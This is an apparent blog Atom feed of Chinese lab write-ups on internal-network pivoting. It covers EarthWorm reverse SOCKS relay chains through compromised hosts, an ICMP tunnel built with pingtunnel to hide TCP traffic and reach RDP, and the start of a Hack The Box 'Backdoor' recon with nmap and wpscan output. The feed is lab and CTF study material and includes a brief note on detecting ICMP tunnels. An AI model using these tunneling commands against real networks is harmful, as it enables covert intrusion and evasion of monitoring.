<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Lluna&#39;s Pure land.</title>
  
  <subtitle>What is life like when singing to wine?</subtitle>
  <link href="https://lunamoore.github.io/atom.xml" rel="self"/>
  
  <link href="https://lunamoore.github.io/"/>
  <updated>2022-01-12T13:29:46.402Z</updated>
  <id>https://lunamoore.github.io/</id>
  
  <author>
    <name>Lluna</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ew的使用记录</title>
    <link href="https://lunamoore.github.io/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://lunamoore.github.io/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2022-01-12T13:18:43.000Z</published>
    <updated>2022-01-12T13:29:46.402Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-实验拓扑"><a href="#0x00-实验拓扑" class="headerlink" title="0x00.实验拓扑"></a>0x00.实验拓扑</h2><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png" class><a id="more"></a><h2 id="0x01-实验一"><a href="#0x01-实验一" class="headerlink" title="0x01.实验一"></a>0x01.实验一</h2><p><strong>当获取到B的权限后，对C进行安全测试</strong></p><p><code>A执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p><code>B执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 114.15.xx.xx -e 8888</span><br></pre></td></tr></table></figure><p><code>代理测试</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112173653122.png" class><h2 id="0x02-实验二"><a href="#0x02-实验二" class="headerlink" title="0x02.实验二"></a>0x02.实验二</h2><p><strong>当获取到C的权限后对D进行安全测试</strong></p><p><code>A执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 1080 -e 8888</span><br></pre></td></tr></table></figure><p><code>C执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s ssocksd -l 9999</span><br></pre></td></tr></table></figure><p><code>B执行，连接A C</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 114.15.xx.xx -e 8888 -f 10.10.10.164 -g 9999</span><br></pre></td></tr></table></figure><p><code>代理测试</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112174844945.png" class><h2 id="0x03-实验三"><a href="#0x03-实验三" class="headerlink" title="0x03.实验三"></a>0x03.实验三</h2><p><strong>当获取到D的权限后对E进行安全测试</strong></p><p><code>A执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rcsocks -l 10801 -e 8886</span><br></pre></td></tr></table></figure><p><code>B执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_slave -d 115.14.xx.xx -e 8886 -f 10.10.10.164 -g 6666</span><br></pre></td></tr></table></figure><p><code>C执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s lcx_listen -l 6666 -e 7778</span><br></pre></td></tr></table></figure><p><code>D执行</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew -s rssocks -d 10.10.20.128 -e 7778</span><br></pre></td></tr></table></figure><p><code>代理测试</code></p><img src="/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112204533430.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-实验拓扑&quot;&gt;&lt;a href=&quot;#0x00-实验拓扑&quot; class=&quot;headerlink&quot; title=&quot;0x00.实验拓扑&quot;&gt;&lt;/a&gt;0x00.实验拓扑&lt;/h2&gt;&lt;img src=&quot;/2022/01/12/ew%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220112203412479.png&quot; class&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="隧道构建" scheme="https://lunamoore.github.io/tags/%E9%9A%A7%E9%81%93%E6%9E%84%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>ew+pingtunnel构建隧道</title>
    <link href="https://lunamoore.github.io/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/"/>
    <id>https://lunamoore.github.io/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/</id>
    <published>2022-01-10T07:51:34.000Z</published>
    <updated>2022-01-12T13:29:38.667Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-实验拓扑"><a href="#0x01-实验拓扑" class="headerlink" title="0x01.实验拓扑"></a>0x01.实验拓扑</h2><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145316199.png" class><a id="more"></a><h2 id="0x02-实验目的"><a href="#0x02-实验目的" class="headerlink" title="0x02.实验目的"></a>0x02.实验目的</h2><blockquote><p>假设win 7已经被我们拿下，通过使用ew+pingtunnel构建socks5隧道，隐藏tcp流量，从而达到访问内网server 2021。</p></blockquote><h2 id="0x03-实验过程"><a href="#0x03-实验过程" class="headerlink" title="0x03.实验过程"></a>0x03.实验过程</h2><h3 id="01-kali执行"><a href="#01-kali执行" class="headerlink" title="01.kali执行"></a>01.kali执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pingtunnel -type server -nolog 1 -noprint 1 -key 6666</span><br></pre></td></tr></table></figure><p>kali作为服务端等待连接</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145902832.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 7777 -e 8888</span><br></pre></td></tr></table></figure><p>将其他机器转发到kali 8888端口的流量转发至kali的7777端口</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145932313.png" class><h3 id="02-win-7执行"><a href="#02-win-7执行" class="headerlink" title="02.win 7执行"></a>02.win 7执行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pingtunnel.exe -type client -l :4444 -s 192.168.1.9 -t 192.168.1.9:8888 -key 6666 -nolog 1 -noprint 1 -sock5 -1</span><br></pre></td></tr></table></figure><p>开启socks5，将icmp隧道的流量使用本地4444端口进行转发</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110150533638.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ew_for_win.exe -s rssocks -d 127.0.0.1 -e 4444</span><br></pre></td></tr></table></figure><p>win 7使用4444端口进行转发</p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152130974.png" class><h3 id="03-测试隧道是否构建成功"><a href="#03-测试隧道是否构建成功" class="headerlink" title="03.测试隧道是否构建成功"></a>03.测试隧道是否构建成功</h3><p><code>查看kali端，出现OK即大概率成功</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152406851.png" class><p><code>使用代理访问server 2021</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152520341.png" class><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152543043.png" class><p><code>使用代理登入3389</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110152636239.png" class><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110153711738.png" class><h3 id="04-wireshark抓包查看"><a href="#04-wireshark抓包查看" class="headerlink" title="04.wireshark抓包查看"></a>04.wireshark抓包查看</h3><p><code>可以看到只有icmp协议，证明流量全部封装到icmp隧道中。</code></p><img src="/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110154031923.png" class><h3 id="05-icmp隧道的防范"><a href="#05-icmp隧道的防范" class="headerlink" title="05.icmp隧道的防范"></a>05.icmp隧道的防范</h3><p>一个正常的ping命令每秒最多发送两个数据包，而使用icmp隧道则再很短时间内产生上千个数据包。</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x01-实验拓扑&quot;&gt;&lt;a href=&quot;#0x01-实验拓扑&quot; class=&quot;headerlink&quot; title=&quot;0x01.实验拓扑&quot;&gt;&lt;/a&gt;0x01.实验拓扑&lt;/h2&gt;&lt;img src=&quot;/2022/01/10/ew-pingtunnel%E6%9E%84%E5%BB%BA%E9%9A%A7%E9%81%93/image-20220110145316199.png&quot; class&gt;</summary>
    
    
    
    <category term="内网渗透测试" scheme="https://lunamoore.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="windows" scheme="https://lunamoore.github.io/tags/windows/"/>
    
    <category term="内网安全" scheme="https://lunamoore.github.io/tags/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    <category term="隧道构建" scheme="https://lunamoore.github.io/tags/%E9%9A%A7%E9%81%93%E6%9E%84%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-Backdoor</title>
    <link href="https://lunamoore.github.io/2022/01/05/HTB-Backdoor/"/>
    <id>https://lunamoore.github.io/2022/01/05/HTB-Backdoor/</id>
    <published>2022-01-05T14:06:19.000Z</published>
    <updated>2022-01-05T14:13:49.845Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-简述"><a href="#0x00-简述" class="headerlink" title="0x00.简述"></a>0x00.简述</h2><img src="/2022/01/05/HTB-Backdoor/image-20220105130426840.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>可以看到只开放了端口80，22，1337</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# rustscan -a 10.10.11.125 -- -A                                                                                           130 ⨯</span><br><span class="line">.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span><br><span class="line">| &#123;&#125;  &#125;| &#123; &#125; |&#123; &#123;__ &#123;_   _&#125;&#123; &#123;__  /  ___&#125; / &#123;&#125; \ |  `| |</span><br><span class="line">| .-. \| &#123;_&#125; |.-._&#125; &#125; | |  .-._&#125; &#125;\     &#125;/  /\  \| |\  |</span><br><span class="line">`-&#x27; `-&#x27;`-----&#x27;`----&#x27;  `-&#x27;  `----&#x27;  `---&#x27; `-&#x27;  `-&#x27;`-&#x27; `-&#x27;</span><br><span class="line">The Modern Day Port Scanner.</span><br><span class="line">________________________________________</span><br><span class="line">: https://discord.gg/GFrQsGy           :</span><br><span class="line">: https://github.com/RustScan/RustScan :</span><br><span class="line"> --------------------------------------</span><br><span class="line">🌍HACK THE PLANET🌍</span><br><span class="line"></span><br><span class="line">[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;</span><br><span class="line">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers</span><br><span class="line">[!] Your file limit is very small, which negatively impacts RustScan&#x27;s speed. Use the Docker image, or up the Ulimit with &#x27;--ulimit 5000&#x27;. </span><br><span class="line">Open 10.10.11.125:22</span><br><span class="line">Open 10.10.11.125:80</span><br><span class="line">Open 10.10.11.125:1337</span><br><span class="line">[~] Starting Script(s)</span><br><span class="line"><span class="meta">[&gt;</span><span class="bash">] Script to be run Some(<span class="string">&quot;nmap -vvv -p &#123;&#123;port&#125;&#125; &#123;&#123;ip&#125;&#125;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line">[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-05 01:50 EST</span><br><span class="line">NSE: Loaded 153 scripts for scanning.</span><br><span class="line">NSE: Script Pre-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:50</span><br><span class="line">Completed NSE at 01:50, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:50</span><br><span class="line">Completed NSE at 01:50, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:50</span><br><span class="line">Completed NSE at 01:50, 0.00s elapsed</span><br><span class="line">Initiating Ping Scan at 01:50</span><br><span class="line">Scanning 10.10.11.125 [4 ports]</span><br><span class="line">Completed Ping Scan at 01:50, 0.31s elapsed (1 total hosts)</span><br><span class="line">Initiating SYN Stealth Scan at 01:50</span><br><span class="line">Scanning backdoor.htb (10.10.11.125) [3 ports]</span><br><span class="line">Discovered open port 22/tcp on 10.10.11.125</span><br><span class="line">Discovered open port 80/tcp on 10.10.11.125</span><br><span class="line">Discovered open port 1337/tcp on 10.10.11.125</span><br><span class="line">Completed SYN Stealth Scan at 01:50, 0.82s elapsed (3 total ports)</span><br><span class="line">Initiating Service scan at 01:50</span><br><span class="line">Scanning 3 services on backdoor.htb (10.10.11.125)</span><br><span class="line">Completed Service scan at 01:53, 175.46s elapsed (3 services on 1 host)</span><br><span class="line">Initiating OS detection (try #1) against backdoor.htb (10.10.11.125)</span><br><span class="line">Retrying OS detection (try #2) against backdoor.htb (10.10.11.125)</span><br><span class="line">Initiating Traceroute at 01:53</span><br><span class="line">Completed Traceroute at 01:53, 1.89s elapsed</span><br><span class="line">Initiating Parallel DNS resolution of 1 host. at 01:53</span><br><span class="line">Completed Parallel DNS resolution of 1 host. at 01:53, 0.04s elapsed</span><br><span class="line">DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><br><span class="line">NSE: Script scanning 10.10.11.125.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:53</span><br><span class="line">Completed NSE at 01:54, 25.13s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 5.01s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">Nmap scan report for backdoor.htb (10.10.11.125)</span><br><span class="line">Host is up, received echo-reply ttl 63 (0.98s latency).</span><br><span class="line">Scanned at 2022-01-05 01:50:23 EST for 229s</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)</span><br><span class="line">| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDqz2EAb2SBSzEIxcu+9dzgUZzDJGdCFWjwuxjhwtpq3sGiUQ1jgwf7h5BE+AlYhSX0oqoOLPKA/QHLxvJ9sYz0ijBL7aEJU8tYHchYMCMu0e8a71p3UGirTjn2tBVe3RSCo/XRQOM/ztrBzlqlKHcqMpttqJHphVA0/1dP7uoLCJlAOOWnW0K311DXkxfOiKRc2izbgfgimMDR4T1C17/oh9355TBgGGg2F7AooUpdtsahsiFItCRkvVB1G7DQiGqRTWsFaKBkHPVMQFaLEm5DK9H7PRwE+UYCah/Wp95NkwWj3u3H93p4V2y0Y6kdjF/L+BRmB44XZXm2Vu7BN0ouuT1SP3zu8YUe3FHshFIml7Ac/8zL1twLpnQ9Hv8KXnNKPoHgrU+sh35cd0JbCqyPFG5yziL8smr7Q4z9/XeATKzL4bcjG87sGtZMtB8alQS7yFA6wmqyWqLFQ4rpi2S0CoslyQnighQSwNaWuBYXvOLi6AsgckJLS44L8LxU4J8=</span><br><span class="line">|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)</span><br><span class="line">| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIuoNkiwwo7nM8ZE767bKSHJh+RbMsbItjTbVvKK4xKMfZFHzroaLEe9a2/P1D9h2M6khvPI74azqcqnI8SUJAk=</span><br><span class="line">|   256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)</span><br><span class="line">|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB7eoJSCw4DyNNaFftGoFcX4Ttpwf+RPo0ydNk7yfqca</span><br><span class="line">80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">|_http-generator: WordPress 5.8.1</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET HEAD POST OPTIONS</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Backdoor &amp;#8211; Real-Life</span><br><span class="line">1337/tcp open  waste?  syn-ack ttl 63</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">SCAN(V=7.91%E=4%D=1/5%OT=22%CT=%CU=33086%PV=Y%DS=2%DC=T%G=N%TM=61D54094%P=x86_64-pc-linux-gnu)</span><br><span class="line">SEQ(SP=105%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)</span><br><span class="line">SEQ(SP=106%GCD=1%ISR=107%TI=Z%CI=Z%TS=B)</span><br><span class="line">OPS(O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11NW7%O6=M54BST11)</span><br><span class="line">WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)</span><br><span class="line">ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)</span><br><span class="line">T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)</span><br><span class="line">T2(R=N)</span><br><span class="line">T3(R=N)</span><br><span class="line">T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)</span><br><span class="line">T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)</span><br><span class="line">T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)</span><br><span class="line">U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)</span><br><span class="line">IE(R=Y%DFI=N%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Uptime guess: 3.355 days (since Sat Jan  1 17:23:05 2022)</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=262 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 22/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   452.39 ms 10.10.16.1</span><br><span class="line">2   862.16 ms backdoor.htb (10.10.11.125)</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">NSE: Starting runlevel 1 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 2 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">NSE: Starting runlevel 3 (of 3) scan.</span><br><span class="line">Initiating NSE at 01:54</span><br><span class="line">Completed NSE at 01:54, 0.00s elapsed</span><br><span class="line">Read data files from: /usr/bin/../share/nmap</span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 230.65 seconds</span><br><span class="line">           Raw packets sent: 76 (5.268KB) | Rcvd: 60 (4.360KB)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="0x02-访问80端口"><a href="#0x02-访问80端口" class="headerlink" title="0x02.访问80端口"></a>0x02.访问80端口</h2><blockquote><p>添加一条host    10.10.11.125    backdoor.htb</p></blockquote><p><code>手动爬虫，可以发现这是一个wordpress的站点，并且没有泄露什么敏感信息</code></p><img src="/2022/01/05/HTB-Backdoor/image-20220105132330901.png" class><h2 id="0x03-wpscan扫描"><a href="#0x03-wpscan扫描" class="headerlink" title="0x03.wpscan扫描"></a>0x03.wpscan扫描</h2><p><code>可以发现wordpress的版本是5.8.1，这个版本历史上还没有爆出漏洞，并且没有扫描出使用的插件</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─# wpscan --url http://10.10.11.125                                                                                           1 ⨯</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.18</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] It seems like you have not updated the database for some time.</span><br><span class="line">[?] Do you want to update now? [Y]es [N]o, default: [N]y</span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://10.10.11.125/ [10.10.11.125]</span><br><span 